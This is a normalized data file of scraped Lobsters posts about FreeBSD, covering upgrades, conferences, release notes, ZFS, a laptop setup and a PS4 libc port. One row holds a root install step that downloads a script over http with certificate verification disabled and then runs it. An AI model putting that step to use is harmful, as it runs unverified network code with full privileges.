access physical drive allows shine come fault detection handling get anything similar interfacing virtual device personally continue using luksbased full disk encryption desktop machine much faster probably touch server either feeling really soon might give native zfs encryption spin p take peek raw data inclined
76,Lobsters,freebsd,FreeBSD,FreeBSD HEAD (CURRNET) Binary Upgrades and Packages,https://up.bsd.lv/,freebsd head currnet binary upgrade package,freebsd current stable binary upgrade disclaimer description freebsdupdate requirement carootnss certctl upgrading difference available update availableupdatestxt installer downloads changelists available upgrade news bsd valuable news question answer email contribute discovery phttpget acknowledgment conor beh build scaleengine michael dexter freebsd foundation,freebsd current stable binary upgrade tracking current nt right passage disclaimer proofofconcept publication freebsd description upbsdlv proofofconcept binary update using freebsdupdate freebsd facilitate exhaustive testing freebsd bhyve hypervisor openzfs help elevate tier status update based svn revision official freebsd release engineering weekly snapshot requirement upgrade use ssl extent possible thus require carootnss package certctl another certificate bundle support retrieval two ssl file note accurate system time date may required proper ssl handling upgrade performed release updated system provided memstick image upgrading upgrade release patch level system specify upbsdlv server signature freebsdupdate upgrade r upbsdlv k freebsdupdate install reboot freebsdupdate install upgrade system freebsdupdate upgrade r upbsdlv k install reboot install upbsdlv train available upgrade listed freebsdupdate listupdates upgrade listed upgrade freebsdupdate upgrade r install reboot install package port work differently official snapshot freebsdupdate fetch supported due nature freebsdupdate patch level tied security advisory difference upbsdlv release different official freebsd current snapshot following way naming convention kernel built genericnodebug configuration file etcfreebsdupdateconf modified use upbsdlv usrsbinfreebsdupdate modified xargs parallel phttpget thank allan jude upbsdlv us http extent possible freebsdupdate output pager update payload build rather dvd image available distribution set available ie available update freebsdupdate listupdates retrieves list availableupdatestxt installer downloads changelists available upgrade news freebsd release supported starting point allowing release system upgrade tested cavium thunderx system raspberry pi upbsdlv featured bsd freebsdupdate listupdates list available upgrade upbsdlv published snapshot vm image tested networking booting vcpus bhyve build system support multiple architecture rather naming changed head current reduce diff upbsdlv featured valuable news question answer q longterm goal effort replaced official freebsd binary update freebsd current stable proofofconcept prof successful q validate thumbprint update server verify etcfreebsdupdateconf includes keyprint q enable verbose output freebsdupdate v debug q release used production determine official snapshot failed boot q get kernel mismatch missing dependency error package probably get exact error official snapshot due dynamic nature current branch q patch level release release patch level tied security advisory investigating patch level facility would usable q platform snapshot tested overdrive note installer may issue vfszfsminautoashift sysctl q receive mirror remaining giving error indicates need rebuild upgrade payload storage upgrade path change please report email encounter q receive upgrade version release using early head build add head whitelist usrsbinfreebsdupdate shell script ie release alpha beta rc stable head current q help test freebsd test testing resource hardware network resource provided outofpocket welcome contribute discovery freebsdupdate handle update server name specified protocol http upbsdlv freebsdupdate depends phttpget support http presumably internal checksum validation adequate mitigate threat use http would allow significantly older release update newer one provided upgrade traversal supported upbsdlv us http extent supported specifically latestssl pubssl file freebsdupdate appear notion target architecture freebsdupdate oriented dvd image work substituted image snapshot include iso dvd image experimenting using distribution set directly moving entirely distribution set might wise freebsdupdateconf moved part packaged base effort appear distinguist architecture object directory making difficult support freebsdupdate check architecture incremental upgrade built buildupgradepatchessh fall back nonr upgrade official unofficial snapshot fail ip length disagrees byte received dhcp request made fail mountroot upon second boot appear resolved acknowledgment thank conor beh codeveloping service colin percival developing freebsdupdate thank freebsd release engineering team maintaining freebsd build infrastructure thank scaleengine providing bandwidth service upbsdlv developed michael dexter michael dexter freebsd trademark freebsd foundation
77,Lobsters,freebsd,FreeBSD,BSDCan2020: Materials released free online,https://www.bsdcan.org/2020/,material released free online,bsdcan bsd conference thanks great bsdcan announce mailing list streaming link want ask question link pgcon announce mailing list sponsor sponsorship opportunity platinum sponsor silver sponsor streaming service provided sponsor announcement http listsbsdcanorgmailmanlistinfobsdcanannounce volunteer volunteer mailing list,bsdcan bsd conference come join u annual bsdcan bsdcan bsd conference held ottawa canada quickly established technical conference people working based operating system related project organizer found fantastic formula appeal wide range people extreme novice advanced developer thanks great bsdcan thank coming bsdcan session recorded available july please subscribe announce mailing list receive notification ready tutorial june wedthu conference june frisat event streamed online see detail note view previously mentioned everything online talk prerecorded talk uploaded youtube conference tutorial live viewing done via web browser question relayed via irc interact tutorial via zoom client zoom client required watch use zoom may recorded streaming link streaming link want ask question also join irc channel provide question speaker answer q session following talk optional speaker speaker might record question later offline q may interrupted next talk time however q session continues recorded complete q session appended talk uploaded later viewing link stream join irc via web browser favorite irc client irc network channel shown bottom respective stream channel nt surprised see pgcon content stream bsdcan start said wait see thing improve decide april thing clearly improving let wait bsdcan online conference person detail soon follow hope help short term early conference month away said early decide eventually make decision decided gonogo date thing improve april move online conference post anything date avoid confusion instead post shortly thereafter please subscribe announce mailing list update sponsor want join group bsdcan sponsor please read sponsorship opportunity platinum sponsor silver sponsor streaming service provided see sponsor announcement please subscribe announcement mailing list kept informed change announced subscribe please follow instruction http listsbsdcanorgmailmanlistinfobsdcanannounce volunteer want volunteer bsdcan please join volunteer mailing list
78,Lobsters,freebsd,FreeBSD,FreeBSD 2020 Community Survey,https://www.research.net/r/freebsd-2020-community-survey,freebsd community survey,,copyright surveymonkey
79,Lobsters,freebsd,FreeBSD,Installing Jitsi Server on FreeBSD,http://www.bobeager.uk/jitsi.html,installing jitsi server freebsd,http meetjitsi http jitsiorg freebsd freebsd creative common attributionnoncommercialsharealike international license file,jitsi open source conferencing video audio system provides similar facility microsoft team zoom blackboard collaborate among others free jitsi server open http meetjitsi registration required detail jitsi found http jitsiorg however possible set private jitsi server required might done perceived ground security improve latency done freebsd quite journey decided share experience written quite detailed document specifically address setting jitsi server freebsd information drawn many disparate source also measure blood sweat tear acknowledgement may found end document document may found comment welcome work licensed creative common attributionnoncommercialsharealike international license file save typing error file partial file required
81,Lobsters,freebsd,FreeBSD,Beckhoff Automation – TwinCAT/BSD – Operating System for Industrial PCs,https://vimeo.com/423074651,beckhoff automation twincatbsd operating system industrial pc,beckhoffcomtwincatbsd,alternative operating system twincatbsd available selected beckhoff industrial pc platform twincatbsd combine twincat runtime xar freebsd industrially tested reliable open source operating system beckhoffcomtwincatbsd
82,Lobsters,freebsd,FreeBSD,FreeBSD 11.4-RC2 Now Available,https://lists.freebsd.org/pipermail/freebsd-snapshots/2020-May/000707.html,freebsd available,freebsd available gjb freebsdorg http http http http http wwwfreebsdfoundationorgdonate information freebsdsnapshots mailing list,freebsd available glen barber gjb freebsdorg sat may utc begin pgp signed message hash second rc build release cycle available installation image available generic generic powerpc generic generic bananapi beaglebone cubieboard cuboxhummingboard rpib wandboard generic note regarding arm sd card image convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system installer image memory stick image available http image checksum follow end email notice problem report bugzilla pr system stable mailing list would like use svn source based update existing system use branch summary change since includes wpasupplicantconf file fixed bsdinstall update leapseconds file update add new port module event type decode sctp fix llvm config header fixed correctly add zlib support ena driver updated version loader fix userboot fix compliance p update permit p flag used mutually knob flush rsb context switch machine smep added fix vagrant image requiring shellsbash port list change since available release note http please note release note page yet complete updated ongoing basis cycle progress virtual machine disk image vm disk image available architecture disk image may downloaded following url freebsd download mirror http partition layout kb freebsdboot gpt partition type bootfs gpt label gb freebsdswap gpt partition type swapfs gpt label gb freebsdufs gpt partition type rootfs gpt label disk image available vhd vmdk raw disk image format image download size approximately mb mb respectively decompressing gb sparse image note regarding virtual machine image modified qemu efi loader file needed able boot virtual machine image see page information http boot vm image run cpu virt bios qemuefifd serial telnet server nographic drive ifnone filevmdisk device virtioblkdevice device virtionetdevice netdev user sure replace vmdisk path virtual machine image amazon ami image amis available following region region region region region region region region region region region region region region region region region vagrant image image available hashicorp atlas site installed running vagrant init vagrant upgrading freebsdupdate utility support binary upgrade system running earlier freebsd release system running earlier freebsd release upgrade follows freebsdupdate upgrade r process freebsdupdate may ask user help merging configuration file confirming automatically performed merging done correctly freebsdupdate install system must rebooted newly installed kernel continuing shutdown r rebooting freebsdupdate need run install new userland component freebsdupdate install recommended rebuild install application possible especially upgrading earlier freebsd release example freebsd alternatively user install compatibility library afterwards system must rebooted new userland shutdown r finally rebooting freebsdupdate need run remove stale file freebsdupdate install iso checksum generic generic powerpc generic generic bananapi beaglebone cubieboard cuboxhummingboard rpib wandboard generic vm image checksum regard glen love freebsd support future release donation freebsd foundation http wwwfreebsdfoundationorgdonate begin pgp signature end pgp signature information freebsdsnapshots mailing list
84,Lobsters,freebsd,FreeBSD,Easy Peasy FreeBSD – DarkMate 12.1,https://www.youtube.com/watch?v=0b3wcHqWGPo,easy peasy freebsd darkmate,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature easy peasy freebsdsy darkmate youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature easy peasy freebsdsy darkmate youtube
85,Lobsters,freebsd,FreeBSD,Beta git conversion available for experimentation,https://lists.freebsd.org/pipermail/freebsd-git/2020-May/000288.html,beta git conversion available experimentation,beta git conversion available experimentation emaste freebsdorg http cgitbetafreebsdorg http cgitbetafreebsdorgdoc http cgitbetafreebsdorgports http cgitbetafreebsdorgsrc information freebsdgit mailing list,beta git conversion available experimentation ed maste emaste freebsdorg wed may utc pleased share git working group beta version freebsd doc port src repository browse repository http cgitbetafreebsdorg three individual repository http cgitbetafreebsdorgdoc http cgitbetafreebsdorgports http cgitbetafreebsdorgsrc compared current git mirror repos github ulrich put lot effort fix svnallfastexport handle mergeinfo address issue git conversion correctly represents vendor branch merges tag operation etc work still ongoing work long tail oddity subversion history caution order git hash repository change experimental purpose point yet used production purpose initial goal maintainer party contrib software freebsd clone check history individual component start experimenting managing vendor branch git model lot detail provided near future wanted share repository link interested party start working new repos information freebsdgit mailing list
86,Lobsters,freebsd,FreeBSD,ZFS versus RAID - 8 Ironwolf Disks - Two Filesystems - One Winner,https://arstechnica.com/gadgets/2020/05/zfs-versus-raid-eight-ironwolf-disks-two-filesystems-one-winner/,zfs versus raid ironwolf disk two filesystems one winner,enlarge explore impact various conventional raid understand zfs work equipment tested summer storage hot rod tested fio initial setup zfs v zfs v conventional raid coverage article megabyte v mebibyte,enlarge neither stopwatch denim jacket strictly necessary honest itaurich lawson getty long test result time truly understand fundamental computer storage important explore impact various conventional raid redundant array inexpensive disk topology performance also important understand zfs work point people particularly computer enthusiast internet want number first quick note testing naturally build fundamental going draw heavily lesson learned explore zfs topology nt yet entirely solid difference pool vdevs ashift recordsize mean strongly recommend revisit explainers diving testing result although everybody love see raw number urge additional focus figure relate one another chart relate performance zfs pool topology size two eight disk performance single disk change model disk raw number change part relation single disk performance equipment tested yes work largely unfinished basement least got window yard nt jim salter summer storage hot rod twelve bay loaded hot first four stuff last eight device test today machine banshee ryzen workstation identical chassis jim salter used eight empty bay summer storage hot rod test got oodles ram enough cpu horsepower chew storage test without breaking sweat storage hot rod also got dedicated host bus adapter hba nt used anything disk test first four bay chassis backup data idle test attached motherboard sata controller entirely isolated test array tested always used fio perform storage test ran locally hot rod used three basic randomaccess test type read write sync write test run blocksizes ran test single process well eight process test using zfs linux found main repository ubuntu lts worth noting zfs linux two year old feature performance improvement newer version openzfs nt available tested annoyance least one senior openzfs ran test current ubuntu lts one current stable distribution general next article zfs tuning update brandnew ubuntu lts much newer zfs linux initial setup zfs v tested mdadm nt really use entire created partition head disk used partition also invoke arcane e avoid preallocation contaminating result using relatively small partition instead entire disk practical necessity since need grovel entire created filesystem disperse preallocated metadata block throughout used full disk usable space eightdisk topology would roughly would taken several hour format similar agonizing wait every topology tested zfs happily nt need want preallocate metadata creates fly become necessary instead fed zfs ironwolf disk entirety nt need wait lengthy formatting topology even largest ready use second two creation special argument needed zfs v conventional raid conventional raid array simple abstraction layer sits filesystem set disk present entire array virtual disk device filesystem perspective indistinguishable actual individual significantly larger largest single disk might zfs entirely different animal encompasses function normally might occupy three separate layer traditional unixlike system logical volume manager raid system filesystem wrapped one merging traditional layer like caused many senior admin grind teeth outrage good reason absolute ton feature zfs offer user unfamiliar highly encouraged take look coverage nextgeneration filesystems basic overview well recent zfs article much comprehensive explanation megabyte v mebibyte last article unit performance measurement kibibyte kib mebibyte mib kibibyte byte mebibyte kibibyte contrast kilobyte byte megabyte kilobyte kibibyte big sibling always standard unit computer storage prior computer professional simply referred k used inaccurate metric prefix spelled time operating system refers gb mb term free space network speed amount really referring gib mib kib storage vendor unfortunately eventually seized upon difference metric way cheaply produce gigabyte drive terabyte ssd really gib hard drive like one testing today really
87,Lobsters,freebsd,FreeBSD,BSD Hardware - Details of BSD Powered Computers Over the World,https://bsd-hardware.info,bsd hardware detail bsd powered computer world,,
88,Lobsters,freebsd,FreeBSD,DarkMate 12.1 - Desktop Install Script for FreeBSD 12.1,https://github.com/broozar/installDesktopFreeBSD,darkmate desktop install script freebsd,darkmate usage advanced option keyboard code http keyboard shortcut wallpaper location screenshots grey theme alternative red wallpaper youtube tutorial click image play known issue difference previous version changelog credit,darkmate desktop install script freebsd script help set desktop system top freebsd install pkg x mate slim additional tool set wheel video user usage install minimal image freebsd source create additional user boot new freebsd system log root navigate yout tmp directory fetch install script github run cd tmp fetch noverifypeer http trisymphonycomdarkmate dmsh chmod x dmsh dmsh follow instruction screen made mistake use ctrlc abort simply run script advanced option launch script additional parmeters x skip xorg installation u force freebsdupdate keyboard code script ask define keyboard layout go default getting standard u layout full list language variant code found http layout changed later point mate simply navigate keyboard setting slim edit file keyboard shortcut superleft superright tile window leftright superup maximize window superdown minimize window supere launch file manager supert launch terminal superb launch browser superc launch calculator superm launch mail wallpaper location custom wallpaper found usrlocalsharebackgroundsfbsd screenshots grey theme alternative red wallpaper youtube tutorial click image play known issue keyboard layout variant checked validity potential input problem new udev change freebsd difference previous version version cut optional desktop software previously asked install software like gimp blender audacity please use pkg rebooted system major refactoring script code cleaned easier follow external data like config file screenshots etc moved separate file downloaded github needed experimental nvidia driver support even custom theming including slim new predefined keyboard shortcut java installer netbeans config rule policykit restoring rebootshutdown mate license change mit gpl new component used changelog refactoring printf new feature tmpfs directory darkmate release switch freebsd first darkmate release switch freebsd added x u parameter fix kdevlc new network check xorg installed default echo removed added freebsdupdate initial release freebsd credit
89,Lobsters,freebsd,FreeBSD,Adventures of porting MUSL to PS4,https://dayzerosec.com/posts/adventures-of-porting-musl-to-ps4/,adventure porting musl,musl overview libc comparing bsd libc musl bsd libc musl custom crt stub using bsd syscalls kernel abi difference userland kernel bug gaslight clear http bug syscall error handling conclusion http githubcomopenorbismusl http http http http,last year working openorbis team develop toolchain building homebrew without violating copyright law using official sdk material easy task building homebrew run system without official tool present many challenge key among challenge executables use customized elf format enables functionality unique console libc library used sony adhere standard libc library adhere redistribute sony library toolchain legal reason tackling custom elf format interesting task may go future process porting musl also offered interesting hurdle lesson overview libc many developer treat libc blackbox nt care libc work care perfectly fine targeting established platform mature libc already working porting new platform however need go nitty gritty detail libc essentially act glue userland kernel example rarely see userland application issue system call directly commonplace world libc break libc fundamental component provided libc application c runtime crt stub initializing environment typically known layer abstract common functionality ie file io networking data type memory management away platform lowlevel interface system call sysctlsioctls etc type definition object thing like stdin stdout stderr error handling errno component must tailored operating system architecture targeted comparing bsd libc musl familiar internals freebsd based system based freebsd sony added system call modified existing kernel code also running custom userland standard syscalls still pretty similar given bsd system base one might ask use bsd libc instead musl match system expose closely knowing decided give shot observation bsd libc musl bsd libc assumed bsd libc would work box minor crt stub change built without issue runtime nt end case even something simple sprintf failed einval pretty incredible considering even listed possible return value man page bummer requires bsd system build build building bsd world massive includes libc navigating codebase far difficult code le easy work much behemoth bsd world build time extremely long musl musl definitely would nt work box without significant change linuxbased libc dealing bsd even getting build required change unlike bsd world musl libc minimal one fixing thing relatively easy code readable easily understood even familiar codebase musl build time blazingly fast compared bsd libc bsd libc would take minute build building musl took closer minute even though theory porting musl would take change building modified bsd libc musl better option considered much easier work much faster build custom crt stub time c program main true entrypoint entrypoint far application author concerned real endpoint usually start unless changed compiler flag preprocessor directive reason c runtime want initialize environment running usercode handled crt stub bulk c runtime bootstrapping code contained object file generally file entrypoint start call libcstartmain passing address userdefined main libcstartmain execute finish initializing environmentrelated stuff little different regard nt conventional environment set argument provided matter fact nt even want application ever return attempting return main crash game make sense game need use argument game never return unless player quits game application mind ignored libcstartmain defined start match closer one produced bsd libc asm intelsyntax noprefix n global start n start n sub rsp n mov rdi n call atexit n xor edx edx n mov edi n mov rsi n call main n mov eax n mov edi n call exit n significant change made customized elf loader dynamic linking custom additional nonstandard sonydefined segment linked apps segment scope article one segment sceprocessparam segment defines metadata information need linked every application crt stub good location put segment always get linked every application built toolchain metadata information includes version magic orbis application entry specialized object sdk version used build app various information snippet custom section wo nt paste full thing brevity sake interested check going port repo looking asm intelsyntax noprefix n align n section datasceprocessparam n sceprocessparam n size quad n magic orbi long n entry count long n using bsd syscalls musl linuxbased libc going invoke linux syscalls bridge gap userland kernel linux freebsd different set syscalls lot similarity example open read write close difference start appear hit le common system call luckily musl written mind provides handy ability custom architecture like target defined allows specify among various thing set input syscall identifier define syscall number musl read bitssyscallhin file architecture directory define nrsyscall define nrexit define nrfork difference syscalls linux freebsd vary depending subsystem file io difference little none others difference merely different name argument switched around case though syscall straight nt exist bsd linux case thing like fast userspace mutexes futexes short porting encountered type difference case different name made alias definition name musl expects defined bsd syscall thing good example set syscalls used signaling alias linux bsd define nrrtsigqueueinfo nrsigqueue define nrrtsigaction nrsigaction define nrrtsigpending nrsigpending harder resolve case like system call existing always exotic functionality ifdef call syscalls nt future functionality need implementing added ifdefing done prevent breaking musl architecture illustrated fanotifyinit syscall exist freebsd int fanotifyinit unsigned flag unsigned eventfflags ifndef return syscall sysfanotifyinit flag eventfflags else return endif change necessary get musl build run bug runtime discrepancy kernel abi linux bsd kernel abi difference application binary interface abi basically specification outline calling convention followed binary format dynamic linking thing calling convention important need know register preserved register trashed volatile aka scratch register register used argument return value userland kernel slightly different calling convention linux bsd use system v sysv abi specification going focus calling convention purpose article sysv following specification apply userland function call register rbx rsp rbp preserved meaning value saved callee function register rax rdi rsi rdx rcx volatile scratch register meaning value saved callee function passing argument returning value following applies order arg arg register rdi rsi rdx rcx used respectively beyond argument passed stack return value stored rax kernel system call register rbx rsp rbp preserved passing argument following applies rax register used specify system call index invoke system call table order arg arg register rdi rsi rdx used respectively first usually return value stored rax second return value exists stored rbx register rcx trashed kernel syscall exception handler store original instruction pointer value syscall usually argument register volatile userland context value saved restored syscall syscall exception handler bug gaslight notice last section said usually argument register value saved restored syscall emphasis usually linux case freebsd used case newer freebsd version january assumption broken system design point view careful register switching privilege level kernel need ensure restore register original value otherwise change returning back userland ideally former one nt want bait switch register value underneath userland caller help sometimes argument register might used store data reused later syscall return especially considering argument register scratch register considered fair game compiler second probably important reason security point view nt want leak kernel register value userland information disclosure like powerful exploitation single handedly destroy kernel aslr seems concern rather restoring register userland value presyscall instead opted clear register value xoring register returning userland galaxy brain idea cause issue discovered issue register figured probably happening checked xfastsyscall exception handler system call kernel dump mov rdi qword rsp mov rsi qword mov rdx qword mov rax qword mov qword mov rcx qword mov rsp qword xor xor xor swapgs sysret clear clear well even interesting code added sony code present freebsd code exist freebsd look git blame bsd contains exception handler implementation notice following commit http clear calleepreserved register syscall exit nonkpti configuration restored fast return syscall reviewed markj approved security sponsored freebsd foundation mfc minute check freebsd kernel calleesave register properly sanitized return system call potentially allowing kernel data used system call exposed suspected kernel information disclosure via scratch register instead restoring properly userlandsaved value zero idea break assumption building bsd libc must special code aware could nt find either bug created issue yet undiscovereddisclosed odd thing dump looked firmware released january commit freebsd mainline however pushed february sony knew problem freebsd year either sony reported issue took land freebsd freebsd maintainer discover issue independently later due fix similar guess likely sony hand mainline freebsd patch fix basically identical fix nt optimal regular clang nt expect behavior compiler like efficient try reuse register possible avoid performance cost reloading register assumption broken logic bug introduced time compiler reuses invoking syscall trigger undefined behavior case pointer cause null pointer dereferences code source level look perfectly valid issue discovered thanks null pointer dereferences example printf musl call function called stdoutwrite issue tiocgwinsz ioctl syscall get window size disassembly code look ok consider syscall clobber boom null pointer dereference mov dword instruction workaround modified syscall wrapper backup restore register static inline long long n long long long long long long asm volatile intelsyntaxnt push push push syscallnt pop pop pop ret n r r r rcx memory return ret bug syscall error handling bug fault anything nt realize sysv extend beyond defining register involved error handling define syscalls indicate error occurred whether return positive negative errno value linux system call success return positive value whatever return commonly descriptor count case failure negative errno returned expecting musl handler check return rax within range set errno appropriately flipping errno back positive negating return long syscallret unsigned long r r errno r return return r freebsd little different though freebsd system call return positive errno negative one one may wonder work would know syscall failed return value interpreted error rather interpreted valid data happens freebsd set carry flag cf flag error success using standard freebsd calling convention carry flag cleared upon success set upon failure took bit time figure way nt feel like hack ended conditional jump based carry flag negated rax flag set change added syscall wrapper static inline long long n long long long long long long asm volatile intelsyntaxnt syscallnt jnc syscallexit nt neg raxnt syscallexit nt ret ret n r r r rcx memory conclusion lot lowlevel factor consider porting something like libc easy get frustrated fall victim subtle discrepancy test musl port wrote suite unit test reader may find interesting compiled openorbis toolchain newlybuilt musl libc static library find link musl port mentioned set test test result directly reference http githubcomopenorbismusl http http http http
90,Lobsters,freebsd,FreeBSD,My new FreeBSD Laptop: Dell Latitude 7390,http://www.daemonology.net/blog/2020-05-22-my-new-FreeBSD-laptop-Dell-7390.html,new freebsd laptop dell latitude,new freebsd laptop dell latitude installing freebsd initial freebsd configuration freebsd configuration spiped desktop configuration tarsnap kde configuration current status nt work first time conclusion freebsd foundation view forum thread blog comment powered,new freebsd laptop dell latitude freebsd developer make point using freebsd whenever including desktop running freebsd laptop since nt always easy year found situation generally improving one thing still lack adequate documentation however writing provide example user also google bait case anyone run problem address month ago galago pro second experience deadswelling batery decided time replace february ordered dell latitude older model laptop originally launched always found dell latitude well built one came attractive price tag rather original price cad usd dell canada selling cad usd assume last stock wanted clear production line laptop came intel cpu quad core mb cache gb ram gb sata ssd window preinstalled display nontouch intel wifi chipset whour battery laptop arrived march made couple upgrade replaced sodimm gb sodimm cad replaced gb ssd intel gb nvme disk cad addition giving double disk space upgrading disk allowed keep window installation intact case ever want put laptop back use running window upgrade nt quite ideal laptop would preferred gb ram dell specification state laptop support maximum gb second disk theoretically wwan pcie slot hold nvme disk comment online suggest dell bios nt allow ssds slot trackstick paid really ca nt complain installing freebsd downloaded memstick image latest freebsd weekly snapshot using old laptop wrote usb disk normally would use release image would make later step easier recent change made code needed support touchpad nt last release reading month future use later release instead branch boot usb stick dell latitude needed press turned system enter boot disk selection menu installing freebsd easy done many time past change several default selecting part freebsd install included src distribution normally would nt needed freebsd source code building kernel module later configuring zfs turned full disk encryption done laptop recently increased swap space gb default gb hope system never need use swap space gb ram nt enough unlikely gb swap space would enough help either turned sshd nt intend connect laptop remotely turned ntpd powerd want clock kept accurate want save power running cpu slower load enabled disabled via etcrcconf later installer offer figured might well system hardening screen enabled cleartmp disablesyslogd disablesendmail option first two principle sendmail something nt use nt want use qmail instead nt enable hardening option since nt significant benefit remove functionality find useful creating cperciva user account added account wheel video group former necessary su root latter necessary application access accelerated video functionality forget log root add later nuisance mention numerous occasion needed exactly installation completes asked installer reboot system removed usb disk initial freebsd configuration first thing turn annoyingly loud console beep echo etcsysctlconf told freebsd use link aggregation networking failing automatically wired ethernet connected wifi network sysrc sysrc wpa sysrc ether wi fi mac add res sysrc clonedinterfaces sysrc laggproto failover laggport laggport dhcp provided wifi network credential via etcwpasupplicantconf network ssid network ssid psk network password started network service netif restart want firewall enabled freebsd pf simple configuration echo block etcpfconf echo set skip etcpfconf echo pas keep state etcpfconf sysrc pfenable yes service pf start annoying part running rather due aforementioned patch recently added support fo touchpad could nt rely completely package built freebsd project instead needed build two package kernel module drmkmod iichid via port tree meant downloading extracting port tree portsnap fetch extract building port make c usrportsgraphicsdrmkmod install clean batchyes make c usrportssysutilsiichid install clean batchyes locking package ensure wo nt upgraded automatically version compiled freebsd pkg lock g kmod iichid able install exist yet time writing step would simply pkg install iichid drmkmod package place could download one needed get basic gui running pkg install xorg sddm basic configuration turn gui telling freebsd load intel video driver sysrc kldlist telling freebsd load hid driver needed touchpad work sysrc kldlist bootmodulesiichidko telling xorg use device exposed via libinput ie touchpad cp telling display manager start boot sysrc sddmenable yes point could reboot watch laptop boot gui logged cperciva opened console ctrlaltt used su become root could configuration freebsd configuration bios dell latitude configures speaker headphone jack independent audio output nt want want sound go speaker default switch headphone jack mute speaker automatically plug headphone told freebsd headphone laptop part audio set speaker use muteandswitchtoheadphones behaviour echo bootloaderconf speaking audio bug hdmi codec result annoying warning unexpected unsolicited response tag command timeout address logged kernel console ed maste working fixing underlying issue provided workaround let silence warning echo bootloaderconf preferred kde environment nt need dbus much one place needed allow gui tool see battery state interact power management sysrc dbusenable yes cpu bug often get fixed via microcode patch want pkg install devcpudata echo cpumicrocodeload yes bootloaderconf echo cpumicrocodename bootfirmwareintelucodebin bootloaderconf want laptop boot faster mean boot loader wait second case want change boot freebsd kernel wait usb device mounting root filesystem know root filesystem nvme disk echo autobootdelay bootloaderconf echo hwusbnobootwait bootloaderconf mentioned like use qmail rather sendmail also use spiped tunnel email mail server pkg install netqmail ucspitcp spiped echo hostname varqmailcontrolme echo varqmailcontrolsmtproutes rm varqmailaliasqmail echo cperciva varqmailaliasqmaildefault cp varqmaildocmailerconfsample etcmailmailerconf sysrc qmailsendenable yes sysrc qmailsmtpdenable yes sysrc qmailsmtpdhost echo allow etctcpsmtp sysrc spipedenable yes sysrc spipedpipes smtp sysrc spipedpipesmtpmode client sysrc spipedpipesmtpsource sysrc spipedpipesmtptarget sysrc spipedpipesmtpkey etcspipedsmtpkey sysrc client sysrc sysrc sysrc finally webcam daemon installed already package pull dependency want enabled want cperciva user able access echo cuseload yes bootloaderconf sysrc webcamdenable yes pw groupmod webcamd cperciva desktop configuration point fully functional desktop environment nt set exactly wanted nt like default kde wallpaper installed new wallpaper pkg install wallpapersfreebsdkde told kde use right click desktop configure desktop scroll select right wallpaper want able print within kde enabled cup already installed kde dependency started necessary since wanted use without rebooting sysrc cupsdenable yes service cupsd start told kde printer system setting printer add printer manual uri http generic postscript printer driver want able control brightness screen aka backlight connected intel video chipset pkg install intelbacklight particular able control via function key fnup fndown dell expose via acpi echo acpivideoload yes bootloaderconf cp usrlocalshareexamplesintelbacklightacpivideointelbacklightconf usrlocaletcdevd long list software want able use case would prefer avoid need nonetheless pkg install firefox libreoffice thunderbird chromium pkg install nano konversation pkg install xournal pdftk pkg install texlivefull pkg install git subversion diffstat portlint sloccount pkg install autoconf autoconfarchive automake libtool pkg install wkhtmltopdf pkg install tarsnap finally want perform hourly backup tarsnap background spinning cpu perform line wrapping added first line avoid breaking web browser echo root nice usrlocalbintarsnap c keyfile roottarsnapkey f date h root etc usrlocaletc usrhome etccrondtarsnap sysrc powerdflags n kde configuration like desktop environment kde myriad setting adjusted change many match personal taste ranging application launcher prefer menu version keyboard shortcut changing desktop use metatab since nt make use kde activity one particularly noteworthy option set tell kde sleep laptop lid closed combination default setting lock screen sleeping give convenient way put laptop away nt want shut completely note however unable hibernate since freebsd necessary support suspendtodisk current status short summary graphic working requires drmkmod backlight brightness control working requires intelbacklight acpivideointelbacklightconf keyboard backlight working controlled via hotkeys touchpad working requires later iichid port volume updown hotkeys working via kmix volume mute hotkey working ethernet working em driver wifi working iwm driver bluetooth tested fan come needed often sd card reader tested suspendresume working webcam working requires cuse webcamdenable hdmi working usb working audio output working autoswitch speaker headphone requires loaderconf setting battery hour typical use depending backlight brightness hour buidworld installation configuration took minute mostly spent downloading gb worth package one thing left copy data across old laptop nt work first time installation configuration process worked end nt nearly smooth first time second time third time issue ran first time installed freebsd installed freebsd caused problem touchpad unresponsive pointer often lagged half second behind release nt code later added upgrading system found video driver nt work freebsd aim maintain compatibility stable branch occasionally issue slip one issue arose branch making drmkmod package built incompatible kernel determined needed confirmed appropriately compiled package video touchpad worked decided reinstall iso downloaded memstick iso corrupted rather truncated guess something broke mirroring week snapshot matter thought use minimemstick iso instead downloads part freebsd want install time rather including iso one nt corrupted installer got downloading bit wanted install could nt recognize wifi network fortunately minor annoyance plugged laptop wired network everything fine one time ca nt remember tried install chromium package turned nt package available week build freebsd packagebuilding cluster failed evergrowing build crossed hour limit package builder decided must gotten stuck reported freebsd port manager team increased chromium time limit could build successfully mean time build port took six hour laptop started working laptop backlight control key would adjust acpivideo notion brightness intelbacklight tool able adjust actual brightness connection two add code freebsd kernel expose brightness change via devd wrote necessary configuration file acpivideointelbacklightconf invoke intelbacklight make necessary change first set lagg interface freebsd switch automatically wired wireless network found needed load wifi driver firmware kernel module via loaderconf rather loaded automatically recentlyadded devmatch tool relied devmatch freebsd startup script would try create link aggregation interface wifi driver loaded unsurprisingly fail aggregate network interface nt exist oneline fix devmatch rcd script moved earlier boot process made two loaderconf line unnecessary finally confusingly found one point plugging unplugging ac power would result laptop going sleep suspend turned due interaction acpi upowerd kde power management option acpi sending notification laptop lid opened system asleep resulting upowerd thinking lid still closed kde got message ac power status changing checked status related power management found lid closed decided go sleep end needed oneline fix freebsd acpi code took three day find one line conclusion freebsd ready desktop yes yes nice freebsd laptop everything work way want took two month worth fiddling spare time fix glitch arose nt anything particularly challenging expect people would give long fixed issue ran hand freebsd ready desktop absolutely fixed issue ran freebsd package built release process bringing gui much easier well biggest thing freebsd need developer acquiring laptop carefully working way issue arise freebsd foundation already started hope month come freebsd user publish report telling u laptop work configuration need view forum thread blog comment powered
91,Lobsters,freebsd,FreeBSD,OpenZFS Adds ZSTD Compression,https://github.com/openzfs/zfs/pull/10278,openzfs add zstd compression,,add zstd zstdfast compression see commit add following compression value accepted pool middleware zstd zstdfast level give acceptable balanced spread compression ratio performance see graph note requires update openzfs able used might also want backport even related middleware change also required see signedoffby kjeld schoutenlebbing kjeld schoutenlebbingnl
